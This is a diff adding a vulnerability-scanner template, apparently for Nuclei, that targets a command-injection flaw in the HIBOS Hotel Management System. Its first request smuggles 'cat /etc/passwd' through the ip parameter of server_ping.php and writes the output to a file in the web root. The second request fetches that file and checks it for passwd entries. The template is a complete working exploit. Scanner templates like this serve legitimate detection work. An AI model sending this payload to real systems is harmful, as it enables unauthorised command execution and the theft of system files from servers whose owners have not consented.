@@ -1,0 +1,40 @@
+id: hibos-hotel-manage-system-rce
+info:
+  name: HIBOS Hotel Management System RCE Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+variables:
+  rand_name: "{{rand_base(5)}}"
+flow: http(1) && http(2)
+http:
+  - id: first-request
+    method: GET
+    path:
+      - "{{BaseURL}}/manager/radius/server_ping.php?ip=127.0.0.1|cat%20/etc/passwd%20>../../{{rand_name}}.txt&id=1"
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "parent.doTestResult"
+  - id: second-request
+    method: GET
+    path:
+      - "{{BaseURL}}/{{rand_name}}.txt"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "root:"
+      - type: word
+        part: body
+        words:
+          - "/bin"
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "<"
